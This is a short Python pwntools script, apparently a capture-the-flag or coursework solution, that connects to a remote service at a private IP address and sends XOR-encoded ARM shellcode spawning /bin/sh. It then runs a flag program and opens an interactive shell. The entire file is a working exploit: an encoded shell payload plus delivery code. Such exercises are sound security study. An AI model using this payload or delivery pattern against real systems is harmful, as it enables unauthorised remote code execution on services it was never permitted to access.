from pwn import *
# context.log_level = 'debug' 

sh = remote('10.15.201.97', 10000)

n = []
shellcode = b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68' + b'\x65\x6c\x6c'
for i in shellcode[:]:
	n.append(i)
for i in range(len(n)):
	n[i] = n[i] ^ 0xAA
shellcode = bytes(n)

sh.recvuntil("give me something to get shell!")
sh.sendline(shellcode)
sh.sendline("./etc/flag.exe 3180105507")
sh.interactive() 



